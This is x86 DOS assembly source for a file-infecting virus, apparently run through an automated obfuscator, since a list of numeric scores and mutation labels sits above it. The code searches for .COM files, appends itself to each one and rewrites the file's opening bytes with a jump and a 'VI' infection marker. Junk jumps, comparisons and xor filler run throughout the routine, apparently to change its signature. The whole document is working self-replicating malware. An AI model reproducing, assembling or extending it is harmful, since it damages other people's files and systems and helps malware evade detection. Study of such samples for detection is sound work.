;2.13878359028
;NoMutation
;1.90869291019
;1.65217923393
;UntouchBlock_1
;1.91354950594
;UntouchBlock_0
;1.62558940513
;1.81703895154
;2.22766139582
;UntouchBlock_0
;1.71224541644
;1.91770474453
;1.30937375355
;1.77981465332
;		JZ 	_0
;1.31312309623
;1.99020430946
;		JZ 	_0
;1.65089516685
;1.70220542351
;1.42559293067
;1.86502266497
;ForcedJMP_0
;1.65461916792
;1.74374926521
;1.26662390382
;1.42865461814
;1.5233036812
;1.47812429925
;		JZ 	_1
;1.34247186117
;UntouchBlock_1
;1.53434250994
;1.29506880632
;UntouchBlock_1
;1.43396196289
;		JNZ 	_0
;1.48209280258
;ForcedJMP_1
;1.36220358629
;UntouchBlock_1
;1.25777539924
;1.09927150227
;		JNZ 	_1
;0.984347271669
;0.933083715633
;		JZ 	_0
;1.18052509532
;		JNZ 	_0
;1.04233072854
;0.992641078706
;		JZ 	_0
;0.929200400284
;ForcedJMP_0
;1.02055731606
;1.01595496749
;UntouchBlock_1
;0.839653532738
;0.862067088851
;0.756769322937
;0.653410059224
;UntouchBlock_0
;0.59471211144
;0.657088145021
;ForcedJMP_1
;0.563624355471
;		JNZ 	_0
;0.464346530609
;0.339553774146
;		JZ 	_1
;		JNZ 	_0
;ForcedJMP_0
MAIN    SEGMENT BYTE
		ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING
		ORG     100H

HOST:
		jmp     NEAR PTR VIRUS_START   
        db      'VI'
        mov     ah,4CH
		JMP 	PD_UW
cmp cx,dx
cmp cx,dx
PD_UW:
        mov     al,0
		cmp 	bx,cx
JZ VZBEO
JMP WZKMB
VZBEO:
WZKMB:
		call 	 VZBEO
        int     21H              

VIRUS:   		                 
COMFILE DB      '*.COM',0        

VIRUS_START:
        call    GET_START       

GET_START:
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS
        mov     dx,OFFSET DTA   
        mov     ah,1AH          
        int     21H        
        call    FIND_FILE       
        jz      N1
        jmp     EXIT_VIRUS      
        N1:
        call    INFECT          
        mov     dx,OFFSET FNAME 
		JMP 	QIPPW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QIPPW:
        mov     WORD PTR [HANDLE],24H    
        mov     ah,9  
XZIFO:
		call 	 FLUYC
        int     21H             

EXIT_VIRUS:
        mov     dx,80H          
        mov     ah,1AH          
        int     21H             
        mov     bx,[VIR_START]  
		cmp 	bx,cx
JZ _RSYJ
JMP ABEDR
_RSYJ:
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]  
        mov     WORD PTR [HOST],ax 
		JMP 	MNQLC
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
MNQLC:
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]        
		cmp 	bx,ax
JNZ FLUYC
JMP XZIFO
FLUYC:
        mov     WORD PTR [HOST+2],ax        
		JMP 	UYPPF
HKBNZ:
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]        
        mov     BYTE PTR [HOST+4],al        
        mov     [VIR_START],100H   
        ret                     

START_CODE:                     
        nop                     
        nop                     
        nop        
        nop        
        nop             
ABEDR:
		call 	 _RSYJ
FZUJM:
		call 	 HZPZX
QAMBJ:
		call 	 HSQJX



FIND_FILE:
        mov     dx,[VIR_START]
        mov     cx,3FH          
		cmp 	ax,dx
JNZ _OALP
JMP FHZHX
_OALP:
		cmp 	bx,cx
JNZ HZPZX
JMP FZUJM
HZPZX:
        mov     ah,4EH          
		JMP 	QAMBJ
HSQJX:
        int     21H
UYPPF:
FHZHX:
		call 	 _OALP
		call 	 HKBNZ


FF_LOOP:
        or      al,al           
		jnz     N2
        jmp     FF_DONE
        N2:         
		call    FILE_OK         
		jnz     N3
        jmp     FF_DONE         
        N3:
		mov     ah,4FH          
		cmp 	cx,cx
JZ MCMMT
JMP UAHRR
MCMMT:
		int     21H             
		jmp     FF_LOOP         

FF_DONE:
        ret
XBGWK:
WXRQL:
		call 	 ZSBAA
		call 	 MOR_Q
UAHRR:
CCRXW:
		call 	 FMIHL
		call 	 MCMMT


FILE_OK:        
        mov     dx,OFFSET FNAME 
		cmp 	cx,ax
JZ ZSBAA
JMP WXRQL
ZSBAA:
		JMP 	XBGWK
MOR_Q:
        mov     dx,OFFSET FNAME 
        mov     ax,3D02H      
		cmp 	dx,cx
JNZ FMIHL
JMP CCRXW
FMIHL:
        int     21H        
        jnc     N6
        jmp     FOK_NZEND     
    N6:
		JMP 	KIHSM
cmp cx,dx
cmp cx,dx
cmp cx,dx
KIHSM:
		JMP 	PMWRM
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
PMWRM:
        mov     bx,ax         
        push    bx            
        mov     cx,5          
        mov     dx,OFFSET START_IMAGE         
		cmp 	cx,cx
JZ GFEKC
JMP VBRIY
GFEKC:
        mov     ah,3FH        
        int     21H        		
        pop     bx            
        mov     ah,3EH        
        int     21H           
        mov     ax,WORD PTR [FSIZE]               
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS 
        jnc     N7
        jmp     FOK_NZEND                         
        N7:
        cmp     BYTE PTR [START_IMAGE],0E9H 
        jz      N4
        jmp FOK_ZEND        
        N4: 
        cmp     WORD PTR [START_IMAGE+3],4956H 
        jz      N5
        jmp     FOK_ZEND           
VBRIY:
		call 	 GFEKC
        N5:


FOK_NZEND:
        mov     al,1          
        or      al,al         
IWHKH:
		call 	 WAATC
        ret

FOK_ZEND:
        xor     al,al         
        ret    
EJBAR:
		call 	 BLYGL
        

INFECT:
        mov     dx,OFFSET FNAME  
        mov     ax,3D02H        
        int     21H        
		JMP 	WCGXQ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WCGXQ:
        mov     WORD PTR [HANDLE],ax            
        xor     cx,cx                       
        mov     dx,cx               
        mov     bx,WORD PTR [HANDLE]        
        mov     ax,4202H                    
        int     21H        
        mov     cx,OFFSET FINAL - OFFSET VIRUS 
        mov     dx,[VIR_START]           
        mov     bx,WORD PTR [HANDLE]                         
		JMP 	IWHKH
WAATC:
		JMP 	NULJF
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
NULJF:
        mov     ah,40H                                      
        int     21H        
        xor     cx,cx           
        mov     dx,WORD PTR [FSIZE]   
        add     dx,OFFSET START_CODE -  OFFSET VIRUS     
        mov     bx,WORD PTR [HANDLE]                         
MHQHQ:
        mov     ax,4200H                               
		cmp 	cx,cx
JNZ BLYGL
JMP EJBAR
BLYGL:
        int     21H        
        mov     cx,5                                    
		JMP 	IFATQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
IFATQ:
		JMP 	SINJA
xor bx,cx
xor bx,cx
SINJA:
        mov     bx,WORD PTR [HANDLE]                    
        mov     dx,OFFSET START_IMAGE                  
        mov     ah,40H        
SO_KP:
        int     21H        
        xor     cx,cx                                 
        mov     dx,cx                             
        mov     bx,WORD PTR [HANDLE]         
		cmp 	ax,cx
JZ INWRL
JMP NQXQM
INWRL:
        mov     ax,4200H                          
NRZK_:
        int     21H
        mov     bx,[VIR_START]                    
		JMP 	GKAYD
KFFGU:
        mov     BYTE PTR [START_IMAGE],0E9H     
C_NSG:
        mov     ax,WORD PTR [FSIZE]             
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3 
        mov     WORD PTR [START_IMAGE+1],ax        
        mov     WORD PTR [START_IMAGE+3],4956H       
        mov     cx,5   
        mov     dx,OFFSET START_IMAGE      
        mov     bx,WORD PTR [HANDLE]       
        mov     ah,40H                     
        int     21H        
        mov     bx,WORD PTR [HANDLE]       
		cmp 	dx,cx
JZ BRCAJ
JMP QBFEJ
BRCAJ:
        mov     ah,3EH                     
JNZ YQLYH
JMP SJHVP
YQLYH:
        int     21H        
NQXQM:
		call 	 INWRL
SJHVP:
		call 	 YQLYH
GKAYD:
		call 	 KFFGU
QBFEJ:
		call 	 BRCAJ
        ret                                

FINAL:           
ENDVIRUS        EQU     $ + 212    


       ORG     0FF2AH

DTA             DB      1AH dup (?) 
FSIZE           DW      0,0         
FNAME           DB      13 dup (?)  
HANDLE          DW      0           
START_IMAGE     DB      0,0,0,0,0   
VSTACK          DW      50H dup (?) 
VIR_START       DW      (?)         

MAIN    ENDS

        END     HOST                   